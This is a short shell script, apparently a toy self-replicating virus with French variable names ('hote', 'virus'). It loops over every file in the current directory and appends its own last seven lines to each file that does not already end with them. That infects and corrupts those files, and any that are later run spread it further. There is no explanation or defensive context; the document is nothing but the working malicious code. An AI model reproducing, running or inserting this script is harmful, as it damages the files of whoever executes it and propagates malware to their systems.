for k in *;do
	hote=$(echo -n $(tail -7 $k)) 
	virus=$(echo -n $(tail -7 $0))
	if [ "$hote" != "$virus" ];then
		tail -n 7 $0 | cat >> $k
	fi
done
